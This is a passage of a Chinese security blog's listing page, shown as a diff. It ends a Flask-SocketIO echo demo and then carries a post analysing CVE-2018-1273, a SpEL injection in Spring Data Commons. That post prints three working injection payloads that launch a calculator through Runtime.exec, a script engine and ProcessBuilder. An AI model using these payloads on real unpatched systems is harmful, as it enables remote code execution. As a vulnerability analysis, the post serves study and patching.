charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    $(document).ready(function() &#123;</span><br><span class="line">        var socket = io.connect();</span><br><span class="line"></span><br><span class="line">        socket.on(&#x27;connect&#x27;, function() &#123;</span><br><span class="line">            socket.emit(&#x27;connect_event&#x27;, &#123;data: &#x27;connected!&#x27;&#125;);</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        socket.on(&#x27;server_response&#x27;, function(msg) &#123;</span><br><span class="line">            $(&#x27;#log&#x27;).append(&#x27;&lt;br&gt;&#x27; + $(&#x27;&lt;div/&gt;&#x27;).text(&#x27;Received #&#x27; + &#x27;: &#x27; + msg.data).html());</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $(&#x27;form#emit&#x27;).submit(function(event) &#123;</span><br><span class="line">                socket.emit(&#x27;client_event&#x27;, &#123;data: $(&#x27;#emit_data&#x27;).val()&#125;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;WebSokect&lt;/h2&gt;</span><br><span class="line">    &lt;form id=&quot;emit&quot; method=&quot;POST&quot; action=&#x27;#&#x27;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;emit_data&quot; id=&quot;emit_data&quot; placeholder=&quot;Message&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Echo&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;div id=&#x27;log&#x27;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from flask import Flask, render_template, session, request</span><br><span class="line">from flask_socketio import SocketIO, emit</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_pyfile(&#x27;config.py&#x27;)</span><br><span class="line"></span><br><span class="line">socketio = SocketIO(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;websocket.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@socketio.on(&#x27;client_event&#x27;)</span><br><span class="line">def client_msg(msg):</span><br><span class="line">    emit(&#x27;server_response&#x27;, &#123;&#x27;data&#x27;: msg[&#x27;data&#x27;]&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@socketio.on(&#x27;connect_event&#x27;)</span><br><span class="line">def connected_msg(msg):</span><br><span class="line">    emit(&#x27;server_response&#x27;, &#123;&#x27;data&#x27;: msg[&#x27;data&#x27;]&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    socketio.run(app, host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+<p><a class="link" target="_blank" rel="noopener" href="https://jiayi.space/post/shi-yong-flask-socketiojin-xing-websockettong-xin">参考<i class="fas fa-external-link-alt"></i></a></p>
+<p><a href="data_trans.zip">源码</a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Apr 22 2018 21:00:00 GMT+0800">2018-04-22</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%BC%80%E5%8F%91/">开发</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/dev/">dev</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Flask%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E7%9A%84%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="CVE-2018-1273: RCE with Spring Data Commons/">
+                        CVE-2018-1273 RCE with Spring Data Commons
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+补丁分析https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653
+
+这里和CVE-2018-1270的修复方案类似，StandardEvaluationContext替换为SimpleEvaluationContext，又看到Expression expression = PARSER.parseExpression(propertyName);，基本可以确定是SpEL注入了
+代码分析（下游）从git上下载源码https://github.com/spring-projects/spring-data-examples
+根据patch的提示设置断点看一下数据流向
+
+传入的值是username
+
+看到setValue，确定是SpEL注入继续往下走，会发现username、password、repeatedPassword三个字段都会经过这几步
+
+既然这样，尝试修改字段名称来执行命令[T(java.lang.Runtime).getRuntime().exec(&#39;open -a calculator.app&#39;)，测试下，确实可以把完整的命令传进去
+[]是嵌套属性的写法，在[]中间可以写入表达式
+
+继续走到setValue处，expression存储的值就是传进来的完整的字段
+
+但是发现命令并没有执行，原因如下
+
+POC利用水平太菜，参考了一下网上的payload，利用java的反射机制绕过
+[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;open -a calculator.app&quot;)]
+[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;open -a calculator.app&#39;)&quot;)]
+[(#root.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(&#39;foo&#39;.split(&#39;&#39;).getClass()).newInstance(&#39;openxx-axxcalculator.app&#39;.split(&#39;xx&#39;))).start()]
+
+参考：http://blog.nsfocus.net/cve-2018-1273-analysis/https://pivotal.io/security/cve-2018-1273https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653https://xz.aliyun.com/t/2269
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p><img lazyload src="/images/loading.svg" data-src="cve-2018-1273.gif" alt="cve-2018-1273"></p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p><a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="15241950741442.jpg"><br><img lazyload src="/images/loading.svg" data-src="15241950952818.jpg"></p>
+<p>这里和CVE-2018-1270的修复方案类似，StandardEvaluationContext替换为SimpleEvaluationContext，又看到Expression expression = PARSER.parseExpression(propertyName);，基本可以确定是SpEL注入了</p>
+<h3 id="代码分析（下游）"><a href="#代码分析（下游）" class="headerlink" title="代码分析（下游）"></a>代码分析（下游）</h3><p>从git上下载源码<a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-data-examples">https://github.com/spring-projects/spring-data-examples<i class="fas fa-external-link-alt"></i></a></p>
+<p>根据patch的提示设置断点看一下数据流向</p>
+<p><img lazyload src="/images/loading.svg" data-src="15241954170838.jpg"></p>
+<p>传入的值是username</p>
+<p><img lazyload src="/images/loading.svg" data-src="15241954802507.jpg"></p>
+<p>看到setValue，确定是SpEL注入<br>继续往下走，会发现username、password、repeatedPassword三个字段都会经过这几步</p>
+<p><img lazyload src="/images/loading.svg" data-src="15241970019444.jpg"></p>
+<p>既然这样，尝试修改字段名称来执行命令<code>[T(java.lang.Runtime).getRuntime().exec(&#39;open -a calculator.app&#39;)</code>，测试下，确实可以把完整的命令传进去</p>
+<p><code>[]是嵌套属性的写法，在[]中间可以写入表达式</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="15242034685528.jpg"></p>
+<p>继续走到setValue处，expression存储的值就是传进来的完整的字段</p>
+<p><img lazyload src="/images/loading.svg" data-src="15242036567489.jpg"></p>
+<p>但是发现命令并没有执行，原因如下</p>
+<p><img lazyload src="/images/loading.svg" data-src="15242046809604.jpg"></p>
+<h3 id="POC利用"><a href="#POC利用" class="headerlink" title="POC利用"></a>POC利用</h3><p>水平太菜，参考了一下网上的payload，利用java的反射机制绕过</p>
+<p><code>[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;open -a calculator.app&quot;)]</code></p>
+<p><code>[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;open -a calculator.app&#39;)&quot;)]</code></p>
+<p><code>[(#root.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(&#39;foo&#39;.split(&#39;&#39;).getClass()).newInstance(&#39;openxx-axxcalculator.app&#39;.split(&#39;xx&#39;))).start()]</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="15242040226247.jpg"></p>
+<p>参考：<br><a class="link" target="_blank" rel="noopener" href="http://blog.nsfocus.net/cve-2018-1273-analysis/">http://blog.nsfocus.net/cve-2018-1273-analysis/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://pivotal.io/security/cve-2018-1273">https://pivotal.io/security/cve-2018-1273<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2269">https://xz.aliyun.com/t/2269<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri Apr 13 2018 21:00:00 GMT+0800">2018-04-13</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="CVE-2018-1273: RCE with Spring Data Commons/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+    </ul>
+
+    <div class="home-paginator">
+        <div class="paginator">
+    
+        <a class="prev btn"
+           href="/page/7/"
+        >Prev</a>
+    
+
+    
+        <a class="next btn"
+           href="/page/9/"
+        >Next</a>
+    
+</div>
+
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
